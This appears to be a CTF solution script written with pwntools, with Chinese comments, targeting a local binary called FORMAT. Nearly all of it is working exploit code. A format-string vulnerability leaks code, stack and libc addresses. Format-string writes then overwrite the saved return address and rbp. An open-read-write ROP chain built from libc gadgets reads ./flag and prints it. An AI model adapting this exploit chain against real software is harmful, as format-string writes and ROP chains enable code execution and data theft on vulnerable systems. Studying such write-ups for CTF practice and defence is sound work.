#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./FORMAT')
elf = ELF('./FORMAT')
libc = ELF('./libc-2.27.so')

def pr(a,addr):
	log.success(a+': '+hex(addr))

'''
def exec_fmt(pad):
	p = process("./FORMAT")
	# send 还是 sendline以程序为准
	p.sendline(pad)
	return p.recv()

fmt = FmtStr(exec_fmt)
offset = fmt.offset
pr('offset',offset)
'''
offset = 6
p.recvuntil("Enter your name: ")
p.send("A"*0x8)
p.recvuntil("A"*0x8)
_start = u64(p.recvuntil("\n",drop=True) + p16(0))
codebase = _start &~ 0xfff
main_read_addr = codebase + 0xaab
main_puts_addr = codebase + 0xa9f

p.recvuntil("Here's your gift: ")
data_addr = int(p.recv(14),16)
ret = data_addr + 0x818

pr('data_addr',data_addr)
pr('rbp',data_addr+0x810)
pr('_start',_start)
pr('codebase',codebase)
pr('main_read_addr',main_read_addr)

#gdb.attach(p)
#pause()

p.recvuntil("Please pwn me :)\n")
payload = "%p.%p.%p" + fmtstr_payload(offset+1, {ret:_start}, numbwritten = 35)
p.send(payload)
data = p.recv(0x200)
print(data)

libcbase = int(data[21:35],16) - 0x110031 
pr('libcbase',libcbase)

bss_addr = libcbase + libc.bss()
syscall_ret = libcbase + 0xd2625 # syscall ; ret
prdx_ret = libcbase + 0x130514 # pop rdx ; pop r10 ; ret
prdi_ret = libcbase + 0x2164f  # pop rdi ; ret
prsi_ret = libcbase + 0x23a6a  # pop rsi ; ret
prax_ret = libcbase + 0x1b500  # pop rax ; ret
prbp_ret = libcbase + 0x213e3  # pop rbp ; ret

#==========================again===============================
# 重新执行程序的时候新返回地址就会比之前的返回地址低 0x100|0xd0

new_ret = ret - 0xd0
new_rbp = new_ret - 0x8
pr('new_ret',new_ret)

p.send("A"*0x8)
p.recvuntil("Please pwn me :)\n")
payload = fmtstr_payload(offset=6,
	writes={new_rbp:new_ret-0x8+0x810, new_ret:main_puts_addr}, 
	write_size_max="byte",write_size="byte")
#puts 写入 new_ret 地址处,然后执行完 puts 再执行 read 为了清空缓冲区
p.sendline(payload)
p.recvuntil("Please pwn me :)\n")

#=============================orw==============================

# open
payload  = './flag\x00\x00'
payload += p64(prdi_ret) + p64(new_ret-0x8) 
payload += p64(prsi_ret) + p64(0)
payload += p64(prax_ret) + p64(2)
payload += p64(syscall_ret)

#read
payload += p64(prdi_ret) + p64(3)
payload += p64(prsi_ret) + p64(bss_addr)
payload += p64(prdx_ret ) + p64(0x30) + p64(0)
payload += p64(prax_ret) + p64(0)
payload += p64(syscall_ret)

#write
payload += p64(prdi_ret) + p64(1)
payload += p64(prsi_ret) + p64(bss_addr)
payload += p64(prdx_ret ) + p64(0x30) + p64(0)
payload += p64(prax_ret) + p64(1)
payload += p64(syscall_ret)

payload  = payload.ljust(0x100,'\x00')

#==============================================================

#gdb.attach(p)
#pause()
p.send(payload)
p.interactive()